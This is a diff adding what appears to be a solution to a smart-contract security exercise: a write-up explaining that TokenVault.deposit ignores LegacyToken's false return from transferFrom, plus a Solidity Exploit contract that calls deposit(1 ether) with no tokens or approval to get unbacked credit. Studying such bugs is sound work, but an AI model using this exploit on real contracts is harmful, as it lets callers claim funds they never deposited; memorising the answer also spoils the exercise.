@@ -1,0 +1,23 @@
+The bug is that `TokenVault.deposit` ignores the boolean returned by `token.transferFrom`. `LegacyToken` returns false on failure instead of reverting, so a caller with no tokens and no allowance still gets credited. That raises `totalDeposits` without any tokens arriving, so the vault's token balance falls below `totalDeposits`.
+
+The exploit calls `deposit(1 ether)` with no approval and no tokens. I wrapped the call in try/catch so `run()` does not revert on a patched vault.
+
+```solidity
+pragma solidity 0.8.28;
+
+interface IVault {
+    function deposit(uint256 amount) external;
+}
+
+contract Exploit {
+    address public vault;
+
+    constructor(address target) payable {
+        vault = target;
+    }
+
+    function run() external {
+        try IVault(vault).deposit(1 ether) {} catch {}
+    }
+}
+```
